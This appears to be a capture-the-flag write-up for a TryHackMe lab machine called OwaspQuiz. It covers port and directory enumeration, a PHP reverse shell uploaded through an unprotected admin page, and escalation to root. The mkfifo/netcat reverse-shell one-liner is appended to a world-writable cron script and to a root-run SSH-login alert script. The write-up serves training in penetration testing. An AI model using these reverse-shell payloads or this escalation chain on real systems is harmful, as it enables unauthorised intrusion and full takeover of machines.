# OwaspQuiz

![](https://i.imgur.com/DLZX3aT.png)
-- -
### username: `peterChain`
-- -
>[!LESSON LEARNED IN THIS MACHINE]
>
>1. Web application Enumeration
>2. Exploitiing `Broken Access Control in admin page`
>3. Exploiting insecure cron jobs
>4. User privilege escalation
>5.  Undestanding linux security alerts, Throught auto email on ssh login
>6.  Exploiting script-binaries-in-path.
>7. Undestanding file attributes
>8. Writting to files with only append mode.
>9. Root privilege escalation throught ssh login

This room was created by [peterchain](https://twitter.com/peterChain7/) on [trychckme](https://tryhackme.com/jr/owaspquiz) platform it's difficulty level was easy.
-- -
Lets start with enumerations as it was proposed by 

## nmap scan 
```bash
nmap  -sC -sV 10.10.176.162 -oN nmap-scan
```

```bash
┌──(gemstone㉿kali)-[~/C7F5/thm/chain]
└─$ cat nmap-scan 
# Nmap 7.92 scan initiated Sat May 14 17:02:25 2022 as: nmap -sC -sV -oN nmap-scan 10.10.176.162
Nmap scan report for 10.10.176.162
Host is up (0.17s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.3
22/tcp   open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:c0:cd:b4:9a:8d:c9:8d:3e:59:0a:a6:f6:90:98:f7 (RSA)
|   256 17:b2:38:4d:f0:d5:d3:4a:a9:15:96:88:aa:d8:25:2b (ECDSA)
|_  256 38:99:59:33:67:ea:c6:e6:24:be:62:70:12:ec:3e:ac (ED25519)
80/tcp   open   http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: home - Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp  closed https
3306/tcp closed mysql
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 14 17:02:52 2022 -- 1 IP address (1 host up) scanned in 27.20 seconds
```
Then this is web and it is running on port 80 and it is open. It contains some other ports open but they  can not help us for now.
-- -
## Gobuster scan
```bash
└─$ gobuster dir -u http://192.168.56.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt 2>/dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/05/21 16:56:38 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 15008]
/images               (Status: 301) [Size: 317] [--> http://192.168.56.103/images/]
/uploads              (Status: 301) [Size: 318] [--> http://192.168.56.103/uploads/]
/gallery.php          (Status: 200) [Size: 3050]                                    
/admin                (Status: 301) [Size: 316] [--> http://192.168.56.103/admin/]  
/assets               (Status: 301) [Size: 317] [--> http://192.168.56.103/assets/] 
^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/05/21 16:56:52 Finished
===============================================================

```

Here we have some useful directories like `/admin` Let's dig more on it.
```bash
└─$ gobuster dir -u http://192.168.56.103/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt 2>/dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103/admin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/05/21 16:58:43 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3991]
/header.php           (Status: 302) [Size: 4] [--> logout.php]
/assets               (Status: 301) [Size: 323] [--> http://192.168.56.103/admin/assets/]
/home.php             (Status: 302) [Size: 8846] [--> logout.php]                        
/logout.php           (Status: 302) [Size: 0] [--> index.php]                            
/slider.php           (Status: 200) [Size: 22426]  
```


Here we get some usefull directories attached to the admin directory.
If we try to visit each directory we will find some  directory redirect us to loggin page. but the directory `/admin/slider.php`. Do not have permission set. So we can access it.
-- -
>[!THEN]
> Visit the `/admin/slider.php`

In this page we can upload file and instructions specifies that it is image upload, but what if we can upload any file example a php file with malicious codes which can give us reverse shell.

>[!INFO]
>This is Broken Access Control Vulnerability, It allows unauthenticated users to view/access the pages for authenticated users


![](https://i.imgur.com/59NR64f.png)

Then i decided to upload the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) php reverse shell which will give us a reverse shell.

>[!info]
Before uploadding a reverse shell payload from pentestmonkey make sure you are listenning with netcat through the following

```bash
┌──(gemstone㉿kali)-[~/C7F5/thm/chain]
└─$ nc -nvlp 1234                            
listening on [any] 1234 ...
```

After uploading it it will prompt the following message 

![](https://i.imgur.com/G76WtKR.png)

Then for us to get the shell we have to make sure that the php reverse shell payload is executing and this can be done by know/identify where excatly the script is uploaded.
On the image above it seems the slider has been added to gallery and in the dir bruteforcing we got `gallery.php` so we will go to that page and refresh it.

![](https://i.imgur.com/09IOZ9e.png)

And after navigating t o gallery page, `Boom!!!` on our netcat we have a shell as user `batman`
```bash
└─$ nc -nlvp 4444                             
listening on [any] 4444 ...
connect to [172.17.17.62] from (UNKNOWN) [172.17.17.87] 33924
Linux owaspQuiz 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 14:04:37 up  1:22,  0 users,  load average: 0.18, 0.54, 0.40
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1002(batman) gid=1002(batman) groups=1002(batman)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(batman) gid=1002(batman) groups=1002(batman)
$ whoami
batman
$ 
```

**We are in.**
-- -
## Stabilize shell.
Now we have shell but it is not stable meaning if we press ctr+c the shell will lost then here are some of the steps.

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
batman@owaspQuiz:/$ 
batman@owaspQuiz:/$ export TERM=xterm-256color

alias ll='ls -lsaht --color=auto'export TERM=xterm-256color
batman@owaspQuiz:/$ 
batman@owaspQuiz:/$ ^Z
zsh: suspended  nc -nvlp 4444
                                                                                   
┌──(gemstone㉿kali)-[~/C7F5/thm/chain]
└─$ stty raw -echo;fg;reset                                                                                                                                                         148 ⨯ 1 ⚙
[1]  + continued  nc -nvlp 4444

batman@owaspQuiz:/$ 
batman@owaspQuiz:/$ 
batman@owaspQuiz:/$ 
```
Then we are good now and  We can continue with privilege escalation.

Check `whoami` with which commands we can run with `sudo -l`.

![](https://i.imgur.com/QNu61Ca.png)

Then we can not view because the batman requires password and we don't have.

Then we will check some other interesting files including flags.

![](https://i.imgur.com/YtO4vsr.png)

After listing some folders we discovered that they are two users in our machine user `batman` and user `munojr`

On munojr home's directory there is our first flag then we will try to read it.
![](https://i.imgur.com/pHEL629.png)

We can not read the file then lets check the cron jobs.
>[!INFO]
>After uploading linpease there is interesting  writable entry in /ect/crontab
-- -

# User privilege escalation.
```bash
batman@owaspQuiz:/home/munojr$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   munojr  /opt/munoupdate.sh
#
batman@owaspQuiz:/home/munojr$ 
```
Interesting there is a script in crontab which runs in every minute and it has named as `munoupdate.sh`

Lets read the file permission and check if we can write it.

```
batman@owaspQuiz:/home/munojr$ ls -l /opt/munoupdate.sh 
-rwxr-xrwx 1 munojr munojr 845 May 13 15:05 /opt/munoupdate.sh
```

`Bravo` we can write on the script then lets read first before changing it.
```bash
batman@owaspQuiz:/home/munojr$ cat  /opt/munoupdate.sh 

#!/bin/bash
startupdate() {
    
                echo
                echo "-----------------------------------------"
                echo ">>> Command Execting Was Successful.  <<<" 
                echo "-----------------------------------------"
                echo
}
start() {
            echo
            echo "***>>> Updating The Operating System <<<***"
            echo         
}
exitUpdate() {
            echo
            echo "-------------------------------------------------------"
            echo ">>>    Operating System Update Has Been Completed   <<<"
            echo "-------------------------------------------------------"
            echo
            exit 1
}
#calls the functions
start
startupdate
exitUpdate
```


We can use the payload  from penetester monkey and listen for the munojr shell in my case i changed to the following.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.11.230 1122 >/tmp/f
```

 And then listening to with netcat.

>[!info]
When you start netcat you have to wait for one minute so that you can have a reverse shell.


```bash
┌──(gemstone㉿kali)-[~/C7F5/thm/chain]
└─$ nc -nvlp 1122
listening on [any] 1122 ...
connect to [10.9.11.230] from (UNKNOWN) [10.10.8.200] 52262
/bin/sh: 0: can't access tty; job control turned off
$ 
```

We know have a shell then we will stabilize as usual and after it lets read the user.txt file first.

```bash
munojr@owaspQuiz:~$ ls
todo.txt  user.txt
munojr@owaspQuiz:~$ cat user.txt 
THM{REDACTED}
```
Now we are half of the journey lets continue to the escalation to root user.
-- -



# Root privilege escalation.
On munojr home directory they were two files and we read only `user.txt` then lets read `todo.txt` file.

```bash
munojr@owaspQuiz:~$ cat todo.txt 
Hey; munojr I want you to automate system security, Make sure an login attempt it reported! kindly make sure all scripts are secure!!

regards peterChain!!

Your current password is : [Redacted]
```

This was a message showing that there are some scripts that do some auto system security.
	Lets upload `linpeas.sh` again to help use recon with user munojr.
	
Running linpease second time there is something interesting
```bash
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
You can write script: /usr/local/sbin/ssh-alert.sh
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh
```

So it seems that there is writable script by user `munojr` 

lets navigate to it 
```bash
munojr@owaspQuiz:/usr/local/sbin$ cat ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@owaspQuiz.thm"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [[ ${PAM_TYPE} == "open_session" ]]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
        exit 1
fi

```

So the script as seen is aimed to run at every ssh login. And after some research, The script runn with root permission.

>[!NOTE]
>The script seems to have some immutable file attributes as shown below. It allows only `append mode!!` using `lsattr` command to view permissions of file.
>

```bash
munojr@owaspQuiz:/usr/local/sbin$ lsattr ssh-alert.sh 
-----a--------e----- ssh-alert.sh
You have new mail in /var/mail/munojr
```

It is bit more confusing if you don't know `Linux`. But after using cat command it is successfully. as bellow.

```bash
munojr@owaspQuiz:/usr/local/sbin$ cat <<EOF >> ssh-alert.sh 
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 1234 >/tmp/f
> EOF
You have new mail in /var/mail/munojr
munojr@owaspQuiz:/usr/local/sbin$ cat ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@owaspQuiz.thm"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [[ ${PAM_TYPE} == "open_session" ]]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
        exit 1
fi
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  x.x.x.x 1234 >/tmp/f
munojr@owaspQuiz:/usr/local/sbin$ 
```


Then login to the system with `id_rsa` and listen to another shell with netcat 
```bash
└─$ ssh munojr@192.168.56.103 -i id_rsa
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 21 May 2022 01:29:57 PM UTC

  System load:  0.3                Users logged in:       1
  Usage of /:   15.4% of 30.88GB   IPv4 address for eth0: 10.0.2.15
  Memory usage: 68%                IPv4 address for eth1: x.x.x.x
  Swap usage:   0%                 IPv4 address for eth2: x.x.x.x
  Processes:    147

  => There is 1 zombie process.


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
You have new mail.
/usr/local/sbin/ssh-alert.sh failed: exit code 1

```

In the other netcatt listener.

```bash
─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [172.17.17.62] from (UNKNOWN) [x.x.x.x] 51856
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# echo `hostname`;whoami
owaspQuiz
root
# cd /root/
# ls -la
total 36
drwx------  5 root root 4096 May 21 13:01 .
drwxr-xr-x 22 root root 4096 May 14 13:20 ..
lrwxrwxrwx  1 root root    9 May 21 13:01 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 May 21 09:30 .local
-rw-------  1 root root  447 May 21 10:32 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   36 May 21 13:01 root.txt
drwxr-xr-x  3 root root 4096 Dec 19 19:42 snap
drwx------  2 root root 4096 Dec 19 19:42 .ssh
# cat root.txt
THM{WREDACTED}
```

###  THE END #####
-- -

Thanks for reading you can check me on [twitter](https://twitter.com/peterChain7).
-- -
